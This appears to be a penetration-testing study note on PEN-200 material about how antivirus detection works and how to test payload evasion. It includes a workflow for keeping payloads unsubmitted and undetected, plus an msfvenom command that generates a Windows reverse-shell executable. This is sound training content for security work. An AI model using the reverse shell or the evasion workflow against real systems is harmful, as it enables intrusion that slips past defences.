# AV Detection and Testing

> **PEN-200 Chapter 12 — testing best practices.** Before changing a payload, understand what the target AV is doing and test against an environment that resembles the target as closely as possible.

## Detection model

Modern antivirus generally combines multiple detection methods:

| Method | What it looks for |
| --- | --- |
| Signature | Known hashes, bytes, strings, or other signatures |
| Heuristic | Suspicious instructions, calls, and code patterns |
| Behavioral | Malicious actions observed during execution/emulation |
| Machine learning | Metadata/patterns used to classify known or unknown threats |

Different AV vendors implement these methods differently, so the same payload can be classified differently by different products.

## Practical testing workflow

```text
1. Identify AV vendor/version/configuration
2. Confirm real-time protection is actually enabled
3. Verify a known-detected payload is blocked
4. Build/use a dedicated VM matching the target environment
5. Disable automatic sample submission in the TEST VM
6. Modify payload / evasion method
7. Scan locally
8. Execute only after the scan result is acceptable
9. Remember EDR/SOC may still detect behavior
```

Targeting the **specific antivirus product** is more realistic and time-efficient than trying to create one payload that bypasses every AV.

## VirusTotal warning

PEN-200 warns against casually uploading engagement payloads to **VirusTotal**:

```text
submit sample
    ↓
hash + original file stored
    ↓
sample/metadata shared with participating AV vendors
    ↓
vendor sandbox / ML analysis
    ↓
new signatures may be created
    ↓
your payload/tooling can become detectable
```

Treat a submitted payload/hash as effectively **burned/public to participating AV vendors**.

PEN-200 mentions **AntiScan.Me** as an alternative that claims not to share submitted samples, but presents third-party multi-AV scanning as a **last resort** when the target AV is unknown. If the AV is known, prefer a dedicated local VM that closely reproduces the customer environment.

## Windows Defender sample submission / cloud protection

In a lab/test VM, PEN-200 recommends disabling **Automatic Sample Submission** so test payloads are not uploaded for cloud analysis.

GUI path shown in the chapter:

```text
Windows Security
  → Virus & threat protection
  → Manage Settings
  → Automatic sample submission
```

Important environmental detail:

- Defender cloud protection and automatic sample submission require **internet connectivity**.
- Some enterprise servers have restricted outbound access, so cloud/ML protection available in one test VM may not match the target.
- Reproduce the target's connectivity and configuration as closely as possible.

## Prefer custom / novel code

PEN-200's rule of thumb is to prefer **custom code** when developing a bypass because signatures are derived from samples. More novel/diversified code has less chance of matching an existing static signature.

This does **not** mean a static bypass is invisible: memory, behavioral, ML, EDR, and SOC monitoring can still detect the activity.

## Quick payload baseline

The chapter uses a standard Metasploit Windows reverse shell as a known-detectable baseline:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f exe > binary.exe
```

Use the baseline to confirm that the test AV is active before evaluating an evasion technique.

See also:

- [[AV Evasion Workflow]]
- [[PowerShell Thread Injection]]
- [[Shellter]]

tag:#windows tag:#av-evasion tag:#testing
